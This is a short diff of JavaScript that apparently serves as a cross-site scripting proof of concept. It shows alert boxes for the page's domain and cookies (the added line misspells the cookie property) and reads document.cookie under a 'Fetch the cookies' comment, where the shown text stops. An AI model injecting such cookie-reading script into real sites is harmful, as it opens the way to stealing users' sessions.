@@ -1,4 +1,5 @@
 alert(document.domain);
+alert(document.cookies);
 
 // Fetch the cookies
 var cookies = document.cookie;
